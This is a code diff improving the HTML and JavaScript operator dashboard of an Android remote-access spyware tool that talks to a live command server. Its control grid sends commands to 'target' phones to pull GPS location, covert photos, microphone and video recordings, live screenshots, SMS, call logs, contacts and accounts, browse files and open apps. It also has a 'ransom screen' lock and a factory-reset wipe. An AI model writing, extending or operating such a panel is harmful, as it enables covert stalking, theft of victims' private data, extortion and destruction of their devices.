@@ -7,15 +7,14 @@
 <style>
   :root{
     --bg:#070b14;
+    --bg2:#0a1020;
     --card:#0f1729;
     --card-2:#141f38;
     --border:#1e2c4d;
     --accent:#7b5cff;
     --accent-2:#22d3ee;
-    --pink:#ff4d9a;
     --danger:#ff3355;
     --success:#00e676;
-    --warn:#ffb020;
     --text:#eef2fa;
     --text-2:#8894b5;
     --text-3:#4d5a7a;
@@ -24,7 +23,7 @@
   html,body{background:radial-gradient(1200px 700px at 50% -10%,#131d3a 0%,#070b14 60%);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Roboto',sans-serif;min-height:100vh;}
   body{padding:14px;display:flex;flex-direction:column;align-items:center;padding-bottom:100px;}
 
-  /* ---------- HEADER ---------- */
+  /* HEADER */
   .header{width:100%;max-width:520px;display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:linear-gradient(180deg,rgba(20,31,56,.85),rgba(15,23,41,.85));backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:18px;margin-bottom:18px;box-shadow:0 8px 30px rgba(0,0,0,.4);}
   .logo{font-size:20px;letter-spacing:.12em;font-weight:900;background:linear-gradient(90deg,var(--accent),var(--accent-2));-webkit-background-clip:text;background-clip:text;color:transparent;text-shadow:0 0 30px rgba(123,92,255,.5);}
   .logo small{display:block;font-size:8px;letter-spacing:.32em;color:var(--text-3);font-weight:600;margin-top:2px;-webkit-text-fill-color:initial;}
@@ -35,31 +34,31 @@
   .screen.active{display:block;animation:fade .3s ease;}
   @keyframes fade{from{opacity:0;transform:translateY(6px);}to{opacity:1;transform:translateY(0);}}
 
-  /* ---------- LOGIN ---------- */
-  .login-wrap{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:22px;padding:38px 24px;margin-top:30px;box-shadow:0 20px 60px rgba(0,0,0,.5), inset 0 1px 0 rgba(255,255,255,.04);}
+  /* LOGIN */
+  .login-wrap{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:22px;padding:38px 24px;margin-top:30px;box-shadow:0 20px 60px rgba(0,0,0,.5);}
   .login-title{text-align:center;font-size:32px;letter-spacing:.12em;font-weight:900;color:#fff;margin-bottom:4px;background:linear-gradient(90deg,#fff,#9bb0ff);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;}
   .login-sub{text-align:center;font-size:10px;letter-spacing:.4em;color:var(--text-3);margin-bottom:34px;}
-  .field{width:100%;background:#070b14;border:1px solid var(--border);border-radius:14px;padding:17px;color:#fff;font-size:14px;font-family:inherit;letter-spacing:.1em;margin-bottom:12px;text-align:center;outline:none;transition:.2s;}
-  .field:focus{border-color:var(--accent);box-shadow:0 0 0 4px rgba(123,92,255,.15),0 0 20px rgba(123,92,255,.2);}
+  .field{width:100%;background:#070b14;border:1px solid var(--border);border-radius:14px;padding:17px;color:#fff;font-size:14px;letter-spacing:.1em;margin-bottom:12px;text-align:center;outline:none;}
+  .field:focus{border-color:var(--accent);box-shadow:0 0 0 4px rgba(123,92,255,.15);}
   .field::placeholder{color:var(--text-3);letter-spacing:.18em;}
-  .btn-main{width:100%;padding:18px;border:none;border-radius:14px;font-family:inherit;font-weight:900;letter-spacing:.22em;font-size:13px;color:#fff;background:linear-gradient(135deg,var(--accent),var(--accent-2));cursor:pointer;box-shadow:0 10px 30px rgba(123,92,255,.4),0 0 40px rgba(34,211,238,.2);transition:.2s;}
-  .btn-main:active{transform:scale(.98);box-shadow:0 4px 15px rgba(123,92,255,.5);}
+  .btn-main{width:100%;padding:18px;border:none;border-radius:14px;font-weight:900;letter-spacing:.22em;font-size:13px;color:#fff;background:linear-gradient(135deg,var(--accent),var(--accent-2));cursor:pointer;box-shadow:0 10px 30px rgba(123,92,255,.4);}
+  .btn-main:active{transform:scale(.98);}
 
-  /* ---------- PAGE TITLES ---------- */
-  .page-title{font-size:24px;font-weight:900;letter-spacing:.08em;color:#fff;margin-bottom:4px;text-shadow:0 0 20px rgba(123,92,255,.3);}
+  /* TITLES */
+  .page-title{font-size:24px;font-weight:900;letter-spacing:.08em;color:#fff;margin-bottom:4px;}
   .page-sub{font-size:11px;color:var(--text-3);letter-spacing:.25em;margin-bottom:20px;}
 
-  /* ---------- DEVICE LIST ---------- */
-  .device-card{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:16px;padding:18px;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;transition:.15s;box-shadow:0 4px 20px rgba(0,0,0,.3);}
+  /* DEVICE LIST */
+  .device-card{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:16px;padding:18px;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;}
   .device-card:active{background:var(--card-2);transform:scale(.99);border-color:var(--accent);}
   .device-card .info{flex:1;}
   .device-card .dev-id{font-size:18px;font-weight:900;letter-spacing:.1em;color:#fff;}
-  .device-card .dev-model{font-size:11px;color:var(--text-2);margin-top:4px;letter-spacing:.05em;}
+  .device-card .dev-model{font-size:11px;color:var(--text-2);margin-top:4px;}
   .device-card .status{font-size:9px;font-weight:800;letter-spacing:.18em;padding:7px 13px;border-radius:20px;}
-  .device-card .status.online{background:rgba(0,230,118,.15);color:var(--success);box-shadow:0 0 16px rgba(0,230,118,.3);}
+  .device-card .status.online{background:rgba(0,230,118,.15);color:var(--success);}
   .device-card .status.offline{background:rgba(77,90,122,.15);color:var(--text-3);}
 
-  /* ---------- DETAIL ---------- */
+  /* DETAIL */
   .back-btn{background:var(--card);border:1px solid var(--border);color:var(--text-2);font-size:11px;letter-spacing:.15em;padding:10px 16px;border-radius:12px;margin-bottom:16px;cursor:pointer;}
   .back-btn:active{background:var(--card-2);}
   .detail-title{font-size:24px;font-weight:900;letter-spacing:.08em;color:#fff;margin-bottom:4px;}
@@ -68,45 +67,49 @@
   .section-label{font-size:11px;font-weight:800;letter-spacing:.3em;color:var(--text-3);margin:26px 0 12px;display:flex;align-items:center;gap:10px;}
   .section-label::before{content:'';width:3px;height:14px;background:linear-gradient(180deg,var(--accent),var(--accent-2));border-radius:2px;box-shadow:0 0 10px var(--accent);}
 
-  /* ---------- CONTROL GRID ---------- */
-  .grid{display:grid;grid-template-columns:1fr 1fr;gap:11px;margin-bottom:8px;}
-  .ctrl{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:16px;padding:18px 10px;display:flex;flex-direction:column;align-items:center;text-align:center;cursor:pointer;transition:.2s;gap:9px;position:relative;overflow:hidden;}
-  .ctrl::before{content:'';position:absolute;inset:0;background:radial-gradient(circle at 50% 0%,rgba(123,92,255,.15),transparent 70%);opacity:0;transition:.3s;}
+  /* CONTROL GRID — now with tiny labels under each button */
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:8px;}
+  .ctrl{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:16px;padding:14px 10px;display:flex;flex-direction:column;align-items:center;text-align:center;cursor:pointer;transition:.2s;gap:6px;position:relative;overflow:hidden;}
   .ctrl:active{transform:scale(.97);border-color:var(--accent);box-shadow:0 0 20px rgba(123,92,255,.4);}
-  .ctrl:active::before{opacity:1;}
-  .ctrl .icon{font-size:26px;filter:drop-shadow(0 0 12px rgba(123,92,255,.6));z-index:1;}
-  .ctrl .label{font-size:10px;font-weight:800;letter-spacing:.15em;color:var(--text);z-index:1;}
-  .ctrl.active{background:linear-gradient(180deg,rgba(0,230,118,.15),rgba(0,230,118,.05));border-color:var(--success);box-shadow:0 0 20px rgba(0,230,118,.3), inset 0 0 20px rgba(0,230,118,.1);}
-  .ctrl.active .icon{filter:drop-shadow(0 0 12px var(--success));}
+  .ctrl .icon{font-size:24px;filter:drop-shadow(0 0 10px rgba(123,92,255,.5));}
+  .ctrl .label{font-size:11px;font-weight:800;letter-spacing:.12em;color:var(--text);}
+  .ctrl .desc{font-size:9px;color:var(--text-3);letter-spacing:.03em;line-height:1.3;margin-top:2px;}
+  .ctrl.active{background:linear-gradient(180deg,rgba(0,230,118,.15),rgba(0,230,118,.05));border-color:var(--success);box-shadow:0 0 20px rgba(0,230,118,.3);}
   .ctrl.active .label{color:var(--success);}
   .ctrl.danger{border-color:rgba(255,51,85,.3);}
-  .ctrl.danger .icon{filter:drop-shadow(0 0 12px rgba(255,51,85,.6));}
   .ctrl.danger:active{background:rgba(255,51,85,.1);box-shadow:0 0 20px rgba(255,51,85,.4);}
 
-  /* ---------- FILES ---------- */
+  /* FILES */
   .files-box{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:14px;min-height:80px;margin-bottom:8px;}
   .files-empty{color:var(--text-3);text-align:center;padding:26px 0;font-size:11px;letter-spacing:.2em;}
 
-  /* ---------- OUTPUT ---------- */
-  .output{background:#04070f;border:1px solid var(--border);border-radius:16px;padding:18px;font-size:14px;color:#b7c9ff;font-family:'Menlo','Courier New',monospace;line-height:1.7;max-height:55vh;min-height:180px;overflow-y:auto;white-space:pre-wrap;word-break:break-word;box-shadow:inset 0 0 40px rgba(123,92,255,.08);}
+  /* OUTPUT */
+  .output{background:#04070f;border:1px solid var(--border);border-radius:16px;padding:18px;font-size:14px;color:#b7c9ff;font-family:'Menlo','Courier New',monospace;line-height:1.7;max-height:60vh;min-height:180px;overflow-y:auto;white-space:pre-wrap;word-break:break-word;box-shadow:inset 0 0 40px rgba(123,92,255,.08);}
   .output .empty{color:var(--text-3);text-align:center;padding:50px 0;letter-spacing:.2em;font-size:12px;}
+  .output img{max-width:100%;border-radius:10px;border:1px solid var(--border);margin-top:8px;box-shadow:0 6px 20px rgba(0,0,0,.5);}
 
-  /* ---------- NAV ---------- */
-  .bottom-nav{width:100%;max-width:520px;position:fixed;bottom:0;left:0;right:0;margin:0 auto;background:rgba(15,23,41,.92);backdrop-filter:blur(24px);border-top:1px solid var(--border);display:flex;justify-content:space-around;padding:14px 0;z-index:10;box-shadow:0 -10px 40px rgba(0,0,0,.5);}
-  .nav-item{background:none;border:none;color:var(--text-3);font-family:inherit;font-size:9px;font-weight:800;letter-spacing:.15em;display:flex;flex-direction:column;align-items:center;gap:5px;padding:6px 18px;cursor:pointer;}
-  .nav-item.active{color:var(--accent-2);text-shadow:0 0 20px rgba(34,211,238,.6);}
+  /* app row tappable */
+  .app-row{display:flex;justify-content:space-between;align-items:center;background:#0f1a33;border:1px solid #1d2f56;border-radius:10px;padding:10px 14px;margin-bottom:6px;cursor:pointer;}
+  .app-row:active{background:#152442;border-color:var(--accent);}
+  .app-row .app-name{color:#e5edf9;font-size:13px;font-weight:600;flex:1;}
+  .app-row .app-open{color:var(--accent-2);font-size:10px;font-weight:800;letter-spacing:.15em;}
+
+  /* NAV */
+  .bottom-nav{width:100%;max-width:520px;position:fixed;bottom:0;left:0;right:0;margin:0 auto;background:rgba(15,23,41,.92);backdrop-filter:blur(24px);border-top:1px solid var(--border);display:flex;justify-content:space-around;padding:14px 0;z-index:10;}
+  .nav-item{background:none;border:none;color:var(--text-3);font-size:9px;font-weight:800;letter-spacing:.15em;display:flex;flex-direction:column;align-items:center;gap:5px;padding:6px 18px;cursor:pointer;}
+  .nav-item.active{color:var(--accent-2);}
   .nav-item .ic{font-size:20px;}
 
-  /* ---------- TOAST ---------- */
-  .toast{position:fixed;bottom:100px;left:50%;transform:translateX(-50%) translateY(20px);background:linear-gradient(135deg,var(--card-2),var(--card));border:1px solid var(--accent);color:#fff;padding:14px 24px;border-radius:14px;font-size:12px;letter-spacing:.08em;opacity:0;transition:.3s;pointer-events:none;z-index:100;box-shadow:0 10px 40px rgba(123,92,255,.4);}
+  /* TOAST */
+  .toast{position:fixed;bottom:100px;left:50%;transform:translateX(-50%) translateY(20px);background:linear-gradient(135deg,var(--card-2),var(--card));border:1px solid var(--accent);color:#fff;padding:14px 24px;border-radius:14px;font-size:12px;opacity:0;transition:.3s;pointer-events:none;z-index:100;box-shadow:0 10px 40px rgba(123,92,255,.4);}
   .toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
 
   .loading{text-align:center;padding:40px 0;color:var(--text-3);font-size:11px;letter-spacing:.25em;}
 
-  /* ---------- MODAL ---------- */
+  /* MODAL */
   .modal{position:fixed;inset:0;background:rgba(0,0,0,.95);display:none;align-items:center;justify-content:center;z-index:200;padding:20px;}
   .modal.show{display:flex;}
-  .modal img{max-width:100%;max-height:90vh;border-radius:14px;border:1px solid var(--accent);box-shadow:0 0 60px rgba(123,92,255,.5);}
+  .modal img{max-width:100%;max-height:90vh;border-radius:14px;border:1px solid var(--accent);}
   .modal-close{position:absolute;top:20px;right:20px;background:var(--card);border:1px solid var(--border);color:#fff;padding:10px 18px;border-radius:12px;font-size:12px;letter-spacing:.12em;cursor:pointer;}
 </style>
 </head>
@@ -144,31 +147,100 @@
 
   <div class="section-label">REMOTE CONTROL</div>
   <div class="grid">
-    <div class="ctrl" data-cmd="loc" data-id="btn-loc"><div class="icon">📍</div><div class="label">LOCATION</div></div>
-    <div class="ctrl" data-cmd="cam" data-id="btn-cam"><div class="icon">📸</div><div class="label">BACK CAM</div></div>
-    <div class="ctrl" data-cmd="selfie" data-id="btn-selfie"><div class="icon">🤳</div><div class="label">SELFIE</div></div>
-    <div class="ctrl" data-cmd="video" data-arg="10" data-id="btn-video"><div class="icon">🎥</div><div class="label">VIDEO 10s</div></div>
-    <div class="ctrl" data-cmd="audio" data-arg="15" data-id="btn-audio"><div class="icon">🎤</div><div class="label">AUDIO 15s</div></div>
-    <div class="ctrl" data-cmd="screen" data-id="btn-screen"><div class="icon">📱</div><div class="label">SCREEN</div></div>
-    <div class="ctrl" data-cmd="live" data-id="btn-live"><div class="icon">🔴</div><div class="label">LIVE SCREEN</div></div>
-    <div class="ctrl" data-cmd="flash" data-id="btn-flash"><div class="icon">⚡</div><div class="label">FLASH SPAM</div></div>
-    <div class="ctrl" data-cmd="sms" data-id="btn-sms"><div class="icon">💬</div><div class="label">SMS</div></div>
-    <div class="ctrl" data-cmd="notif" data-id="btn-notif"><div class="icon">🔔</div><div class="label">NOTIF</div></div>
-    <div class="ctrl" data-cmd="contacts" data-id="btn-contacts"><div class="icon">👤</div><div class="label">CONTACTS</div></div>
-    <div class="ctrl" data-cmd="calls" data-id="btn-calls"><div class="icon">📞</div><div class="label">CALLS</div></div>
-    <div class="ctrl" data-cmd="accounts" data-id="btn-accounts"><div class="icon">👥</div><div class="label">ACCOUNTS</div></div>
-    <div class="ctrl" data-cmd="apps" data-id="btn-apps"><div class="icon">📦</div><div class="label">APPS</div></div>
-    <div class="ctrl" data-cmd="files" data-arg="/sdcard" data-id="btn-files"><div class="icon">📁</div><div class="label">FILES</div></div>
-    <div class="ctrl" data-cmd="toast" data-id="btn-toast"><div class="icon">💭</div><div class="label">TOAST</div></div>
-    <div class="ctrl danger" data-cmd="lock" data-id="btn-lock"><div class="icon">🔒</div><div class="label">LOCK</div></div>
-    <div class="ctrl danger" data-cmd="wipe" data-id="btn-wipe"><div class="icon">⚠️</div><div class="label">WIPE</div></div>
+    <div class="ctrl" data-cmd="loc" data-id="btn-loc">
+      <div class="icon">📍</div>
+      <div class="label">LOCATION</div>
+      <div class="desc">Get GPS & map link</div>
+    </div>
+    <div class="ctrl" data-cmd="cam" data-id="btn-cam">
+      <div class="icon">📸</div>
+      <div class="label">BACK CAM</div>
+      <div class="desc">Rear photo</div>
+    </div>
+    <div class="ctrl" data-cmd="selfie" data-id="btn-selfie">
+      <div class="icon">🤳</div>
+      <div class="label">SELFIE</div>
+      <div class="desc">Front photo</div>
+    </div>
+    <div class="ctrl" data-cmd="video" data-arg="10" data-id="btn-video">
+      <div class="icon">🎥</div>
+      <div class="label">VIDEO</div>
+      <div class="desc">10s rear recording</div>
+    </div>
+    <div class="ctrl" data-cmd="audio" data-arg="15" data-id="btn-audio">
+      <div class="icon">🎤</div>
+      <div class="label">AUDIO</div>
+      <div class="desc">15s mic recording</div>
+    </div>
+    <div class="ctrl" data-cmd="screen" data-id="btn-screen">
+      <div class="icon">📱</div>
+      <div class="label">SCREENSHOT</div>
+      <div class="desc">Capture current screen</div>
+    </div>
+    <div class="ctrl" data-cmd="live" data-id="btn-live">
+      <div class="icon">🔴</div>
+      <div class="label">LIVE SCREEN</div>
+      <div class="desc">Continuous screenshots</div>
+    </div>
+    <div class="ctrl" data-cmd="flash" data-id="btn-flash">
+      <div class="icon">⚡</div>
+      <div class="label">FLASH SPAM</div>
+      <div class="desc">Blink LED on/off</div>
+    </div>
+    <div class="ctrl" data-cmd="sms" data-id="btn-sms">
+      <div class="icon">💬</div>
+      <div class="label">SMS</div>
+      <div class="desc">Last 50 inbox messages</div>
+    </div>
+    <div class="ctrl" data-cmd="notif" data-id="btn-notif">
+      <div class="icon">🔔</div>
+      <div class="label">NOTIFICATIONS</div>
+      <div class="desc">Recent notifications</div>
+    </div>
+    <div class="ctrl" data-cmd="contacts" data-id="btn-contacts">
+      <div class="icon">👤</div>
+      <div class="label">CONTACTS</div>
+      <div class="desc">Full contact list</div>
+    </div>
+    <div class="ctrl" data-cmd="calls" data-id="btn-calls">
+      <div class="icon">📞</div>
+      <div class="label">CALL LOG</div>
+      <div class="desc">Last 50 calls</div>
+    </div>
+    <div class="ctrl" data-cmd="accounts" data-id="btn-accounts">
+      <div class="icon">👥</div>
+      <div class="label">ACCOUNTS</div>
+      <div class="desc">Google, WhatsApp, etc.</div>
+    </div>
+    <div class="ctrl" data-cmd="apps" data-id="btn-apps">
+      <div class="icon">📦</div>
+      <div class="label">APPS</div>
+      <div class="desc">Installed apps (tap to open)</div>
+    </div>
+    <div class="ctrl" data-cmd="files" data-arg="/sdcard" data-id="btn-files">
+      <div class="icon">📁</div>
+      <div class="label">FILES</div>
+      <div class="desc">Browse /sdcard</div>
+    </div>
+    <div class="ctrl" data-cmd="toast" data-id="btn-toast">
+      <div class="icon">💭</div>
+      <div class="label">TOAST</div>
+      <div class="desc">Show popup on target</div>
+    </div>
+    <div class="ctrl danger" data-cmd="lock" data-id="btn-lock">
+      <div class="icon">🔒</div>
+      <div class="label">LOCK</div>
+      <div class="desc">Show ransom screen</div>
+    </div>
+    <div class="ctrl danger" data-cmd="wipe" data-id="btn-wipe">
+      <div class="icon">⚠️</div>
+      <div class="label">WIPE</div>
+      <div class="desc">Factory reset target</div>
+    </div>
   </div>
 
-  <div class="section-label">FILES RECEIVED</div>
-  <div class="files-box" id="filesBox"><div class="files-empty">NO FILES YET</div></div>
-
-  <div class="section-label">OUTPUT</div>
-  <div class="output" id="outputBox"><div class="empty">NO OUTPUT YET</div></div>
+  <div class="section-label">LIVE OUTPUT</div>
+  <div class="output" id="outputBox"><div class="empty">WAITING FOR COMMAND</div></div>
 </div>
 
 <!-- NAV -->
@@ -186,7 +258,16 @@
 
 <script>
 const SERVER = "https://void-vult-server-bepe.onrender.com";
-let state = {token:null, userId:null, currentDevice:null, pollTimer:null, liveOn:false, flashOn:false, lastResultId:0};
+let state = {
+  token:null,
+  userId:null,
+  currentDevice:null,
+  pollTimer:null,
+  liveOn:false,
+  flashOn:false,
+  lastResultId:0,
+  activeCommand: null  // track which command's result we're expecting
+};
 
 function $(id){return document.getElementById(id);}
 function showToast(msg){const t=$('toast');t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2200);}
@@ -255,10 +336,10 @@ async function openDevice(userId){
   state.liveOn = false;
   state.flashOn = false;
   state.lastResultId = 0;
+  state.activeCommand = null;
   $('detailTitle').textContent = userId;
   $('detailSub').textContent = 'LOADING INFO';
-  $('outputBox').innerHTML = '<div class="empty">NO OUTPUT YET</div>';
-  $('filesBox').innerHTML = '<div class="files-empty">NO FILES YET</div>';
+  $('outputBox').innerHTML = '<div class="empty">WAITING FOR COMMAND</div>';
   document.querySelectorAll('.ctrl').forEach(c=>c.classList.remove('active'));
   showScreen('screenDetail');
   try{
@@ -291,10 +372,13 @@ document.querySelectorAll('.ctrl').forEach(el=>{
     let arg = el.dataset.arg || '';
     const btnId = el.dataset.id;
 
-    if(cmd === 'wipe'){ if(!confirm('WIPE THE TARGET DEVICE? This cannot be undone.')) return; }
+    if(cmd === 'wipe'){ if(!confirm('WIPE THE TARGET DEVICE? Cannot be undone.')) return; }
     if(cmd === 'toast'){ const t = prompt('Toast message:', 'Hello'); if(t === null) return; arg = t; }
+    if(cmd === 'files'){ const p = prompt('Folder path:', '/sdcard'); if(p === null) return; arg = p; }
+    if(cmd === 'video'){ const s = prompt('Video length (seconds):', '10'); if(s === null) return; arg = s; }
+    if(cmd === 'audio'){ const s = prompt('Audio length (seconds):', '15'); if(s === null) return; arg = s; }
 
-    // Toggle logic for flash and live
+    // Toggle logic for live and flash
     if(cmd === 'flash'){
       state.flashOn = !state.flashOn;
       if(state.flashOn){ el.classList.add('active'); arg = 'on'; showToast('FLASH SPAM ON'); }
@@ -304,6 +388,13 @@ document.querySelectorAll('.ctrl').forEach(el=>{
       state.liveOn = !state.liveOn;
       if(state.liveOn){ el.classList.add('active'); arg = 'on'; showToast('LIVE ON'); }
       else { el.classList.remove('active'); arg = 'off'; showToast('LIVE OFF'); }
+    }
+
+    // Clear output for new command (except toggles)
+    if(cmd !== 'flash' && cmd !== 'live'){
+      state.activeCommand = cmd;
+      state.lastResultId = 0;
+      $('outputBox').innerHTML = '<div class="empty">EXECUTING ' + cmd.toUpperCase() + '...</div>';
     }
 
     try{
@@ -333,54 +424,91 @@ function startResultPoll(){
       if(liveBtn){ if(state.liveOn) liveBtn.classList.add('active'); else liveBtn.classList.remove('active'); }
       if(flashBtn){ if(state.flashOn) flashBtn.classList.add('active'); else flashBtn.classList.remove('active'); }
 
-      // New results only
+      // Results
       if(j.results && j.results.length){
         const box = $('outputBox');
-        // First time: clear empty placeholder
+        // First time only: clear empty placeholder
         if(box.querySelector('.empty')) box.innerHTML = '';
+
+        // Filter for only NEW results, and only matching active command if set
         j.results.forEach(res=>{
           if(res.at <= state.lastResultId) return;
+          if(state.activeCommand && res.cmd !== state.activeCommand &&
+             !(state.activeCommand === 'screen' && res.cmd === 'mp_screen') &&
+             !(state.activeCommand === 'live' && res.cmd === 'mp_live')) return;
           state.lastResultId = res.at;
+
           const line = document.createElement('div');
           line.style.marginBottom = '14px';
-          line.style.paddingBottom = '10px';
+          line.style.paddingBottom = '12px';
           line.style.borderBottom = '1px solid #1a2440';
-          line.innerHTML =
-            '<div style="color:#8b7aff;font-weight:700;font-size:13px;letter-spacing:.1em;text-shadow:0 0 12px rgba(139,122,255,.5);">&gt; ' + esc(res.cmd).toUpperCase() + '</div>' +
-            '<div style="color:#b7c9ff;font-size:13px;line-height:1.7;margin-top:6px;word-break:break-word;">' + esc(res.data||'(empty)') + '</div>' +
-            '<div style="color:#4d5a7a;font-size:10px;margin-top:6px;letter-spacing:.1em;">' + new Date(res.at).toLocaleTimeString() + '</div>';
+
+          // Special rendering for apps
+          if(res.cmd === 'apps' && res.data){
+            let html = '<div style="color:#8b7aff;font-weight:700;font-size:13px;letter-spacing:.1em;margin-bottom:10px;">&gt; INSTALLED APPS</div>';
+            const lines = res.data.split('\n');
+            let count = 0;
+            lines.forEach(l => {
+              if(l.indexOf(' | ') > -1){
+                const parts = l.split(' | ');
+                const name = parts[0].trim();
+                const pkg = parts[1] ? parts[1].trim() : '';
+                if(pkg){
+                  html += '<div class="app-row" data-pkg="' + esc(pkg) + '">'
+                    + '<div class="app-name">' + esc(name) + '</div>'
+                    + '<div class="app-open">OPEN ▸</div>'
+                    + '</div>';
+                  count++;
+                }
+              }
+            });
+            html += '<div style="color:#4d5a7a;font-size:10px;margin-top:8px;">' + count + ' apps • ' + new Date(res.at).toLocaleTimeString() + '</div>';
+            line.innerHTML = html;
+          }
+          // Special rendering for screenshots
+          else if(j.uploads && j.uploads.length){
+            const matchUpload = j.uploads.find(u => {
+              return (u.type && res.cmd && u.type.toLowerCase().indexOf(res.cmd) === 0) ||
+                     (res.cmd === 'screen' && u.type && u.type.toLowerCase() === 'screen') ||
+                     (res.cmd === 'mp_screen' && u.type && u.type.toLowerCase() === 'screen') ||
+                     (res.cmd === 'mp_live' && u.type && u.type.toLowerCase() === 'live');
+            });
+            if(matchUpload){
+              const url = matchUpload.url || (SERVER + '/file/' + encodeURIComponent(matchUpload.name));
+              line.innerHTML =
+                '<div style="color:#8b7aff;font-weight:700;font-size:13px;letter-spacing:.1em;">&gt; ' + esc(res.cmd).toUpperCase() + '</div>' +
+                '<img src="' + url + '" onclick="openImage(\'' + url + '\')" style="cursor:pointer;"/>' +
+                '<div style="color:#4d5a7a;font-size:10px;margin-top:6px;">' + new Date(res.at).toLocaleTimeString() + '</div>';
+            } else {
+              line.innerHTML =
+                '<div style="color:#8b7aff;font-weight:700;font-size:13px;letter-spacing:.1em;">&gt; ' + esc(res.cmd).toUpperCase() + '</div>' +
+                '<div style="color:#b7c9ff;font-size:13px;line-height:1.7;margin-top:6px;word-break:break-word;">' + esc(res.data||'(empty)') + '</div>' +
+                '<div style="color:#4d5a7a;font-size:10px;margin-top:6px;">' + new Date(res.at).toLocaleTimeString() + '</div>';
+            }
+          }
+          else {
+            line.innerHTML =
+              '<div style="color:#8b7aff;font-weight:700;font-size:13px;letter-spacing:.1em;">&gt; ' + esc(res.cmd).toUpperCase() + '</div>' +
+              '<div style="color:#b7c9ff;font-size:13px;line-height:1.7;margin-top:6px;word-break:break-word;">' + esc(res.data||'(empty)') + '</div>' +
+              '<div style="color:#4d5a7a;font-size:10px;margin-top:6px;">' + new Date(res.at).toLocaleTimeString() + '</div>';
+          }
           box.insertBefore(line, box.firstChild);
         });
-      }
 
-      // Files
-      if(j.uploads && j.uploads.length){
-        const fb = $('filesBox');
-        fb.innerHTML = '';
-        j.uploads.slice(-20).reverse().forEach(up=>{
-          const type = (up.type || 'file').toLowerCase();
-          const url = up.url || (SERVER + '/file/' + encodeURIComponent(up.name));
-          const wrapper = document.createElement('div');
-          wrapper.style.marginBottom = '12px';
-          wrapper.style.paddingBottom = '12px';
-          wrapper.style.borderBottom = '1px solid #1a2440';
-
-          if (type === 'screen' || type === 'live' || type === 'photo' || type === 'cam' || type === 'selfie') {
-            wrapper.innerHTML =
-              '<div style="color:#8b7aff;font-size:11px;font-weight:700;letter-spacing:.15em;margin-bottom:8px;">' + type.toUpperCase() + '</div>' +
-              '<img src="' + url + '" style="width:100%;border-radius:12px;border:1px solid #1e2c4d;cursor:pointer;box-shadow:0 4px 20px rgba(0,0,0,.4);" onclick="openImage(\'' + url + '\')"/>' +
-              '<div style="color:#4d5a7a;font-size:10px;margin-top:6px;">' + new Date(up.at).toLocaleTimeString() + '</div>';
-          } else {
-            wrapper.innerHTML =
-              '<div style="color:#8b7aff;font-size:11px;font-weight:700;letter-spacing:.15em;margin-bottom:8px;">' + type.toUpperCase() + '</div>' +
-              '<a href="' + url + '" style="color:#22d3ee;font-size:13px;word-break:break-all;">' + esc(up.name||type) + '</a>' +
-              '<div style="color:#4d5a7a;font-size:10px;margin-top:6px;">' + new Date(up.at).toLocaleTimeString() + '</div>';
-          }
-          fb.appendChild(wrapper);
+        // Attach click handlers to app rows
+        document.querySelectorAll('.app-row').forEach(row => {
+          row.onclick = async () => {
+            const pkg = row.dataset.pkg;
+            if(!pkg || !state.currentDevice) return;
+            try{
+              await fetch(SERVER+'/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:state.currentDevice, cmd:'open', args:pkg})});
+              showToast('Opening ' + pkg.split('.').pop());
+            }catch(e){ showToast('Error'); }
+          };
         });
       }
     }catch(e){}
-  }, 3000);
+  }, 2000);
 }
 
 function openImage(url){
